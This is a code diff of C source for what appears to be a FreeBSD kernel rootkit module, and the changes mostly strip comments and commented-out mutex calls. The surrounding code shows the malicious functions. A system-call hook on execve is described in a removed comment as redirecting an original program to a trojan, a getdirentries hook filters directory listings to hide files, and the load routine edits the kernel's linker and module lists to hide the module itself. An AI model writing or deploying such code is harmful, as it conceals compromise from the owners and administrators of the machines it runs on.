@@ -30,7 +30,6 @@
 * to hide this module, which aren't defined in any header files.
 */
 extern linker_file_list_t linker_files;
-//extern struct mtx kld_mtx;
 extern int next_file_id;
 typedef TAILQ_HEAD(, module) modulelist_t;
 extern modulelist_t modules;
@@ -46,10 +45,7 @@ struct module {
     void *arg; /* argument for handler */
     modspecific_t data; /* module specific data */
 };
-/*
-* execve system call hook.
-* Redirects the execution of ORIGINAL into TROJAN.
-*/
+
 static int
 execve_hook(struct thread *td, void *syscall_args) {
      return(sys_execve(td, syscall_args));
@@ -78,8 +74,7 @@ getdirentries_hook(struct thread *td, void *syscall_args)
      size = td->td_retval[0];
  /* Does fd actually contain any directory entries? */
      if (size > 0) {
-         //malloc(dp, struct dirent *, size, M_TEMP, M_NOWAIT);
-	 //MALLOC_DECLARE(dirent);
+     
 	 dp = malloc(size, M_DEVBUF ,M_NOWAIT);
          copyin(uap->buf, dp, size);
          current = dp;
@@ -128,7 +123,7 @@ load(struct module *module, int cmd, void *arg)
     struct linker_file *lf;
     struct module *mod;
     mtx_lock(&Giant);
-    //mtx_lock(&kld_mtx);
+ 
 /* Decrement the current kernel image's reference count. */
     (&linker_files)->tqh_first->refs--;
 /*
@@ -142,7 +137,7 @@ load(struct module *module, int cmd, void *arg)
             break;
         }
     }
-    //mtx_unlock(&kld_mtx);
+ 
     mtx_unlock(&Giant);
     sx_xlock(&modules_sx);
 /*
